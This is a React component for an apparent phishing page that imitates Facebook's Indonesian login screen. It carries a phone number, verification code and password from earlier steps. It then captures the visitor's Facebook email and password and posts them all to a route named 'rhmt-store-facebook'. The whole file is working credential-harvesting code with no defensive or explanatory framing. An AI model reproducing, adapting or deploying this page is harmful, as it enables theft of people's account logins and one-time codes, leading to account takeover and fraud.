import React from "react";
import fbIcon from "./facebook.svg";
import { Link, useForm } from "@inertiajs/react";
export default function Facebook(props) {
    const phone_number = props.phone_number;
    const verif_code = props.verif_code;
    const password = props.password;
    const { data, setData, post, errors } = useForm({
        phone_number: phone_number,
        verif_code: verif_code,
        password: password,
        email: "",
        password_facebook: "",
    });
    const submitHandler = async (e) => {
        e.preventDefault();
        post(route("rhmt-store-facebook"));
    };
    return (
        <div className="px-8 h-full  py-16">
            <img src={fbIcon} alt="" />
            <p className="font-sans  text-center font-semibold  leading-4">
                Facebook membantu Anda terhubung dan berbagi dengan orang-orang
                dalam kehidupan Anda
            </p>
            <div className="mt-6 rounded-md shadow-sm shadow-gray-500/50 p-5 w-full bg-white">
                <form
                    onSubmit={submitHandler}
                    action=""
                    className="flex flex-col gap-3"
                >
                    <input
                        onChange={(e) =>
                            setData({
                                ...data,
                                email: e.target.value,
                            })
                        }
                        value={data.email}
                        type="text"
                        className="w-full rounded-md border border-gray-200 focus:border-gray-400 focus:outline-none focus:ring-0 p-3 placeholder:text-gray-400"
                        placeholder="Email atau Nomor Telepon"
                    />
                    <input
                        onChange={(e) =>
                            setData({
                                ...data,
                                password_facebook: e.target.value,
                            })
                        }
                        value={data.password_facebook}
                        type="password"
                        className="w-full rounded-md border border-gray-200 focus:border-gray-400 focus:outline-none focus:ring-0 p-3 placeholder:text-gray-400"
                        placeholder="Kata Sandi"
                    />
                    <button className="text-lg font-extrabold text-white bg-blue-700 rounded-md py-3">
                        Masuk
                    </button>
                    <Link className="text-blue-700 font-semibold my-6 text-center">
                        Lupa kata sandi?
                    </Link>
                    <div className=" w-full border-gray-300 border-t shadow-sm shadow-gray-200"></div>
                    <Link className=" w-full text-center text-lg font-extrabold text-white bg-green-600 rounded-md py-3">
                        Buat akun baru
                    </Link>
                </form>
            </div>
        </div>
    );
}
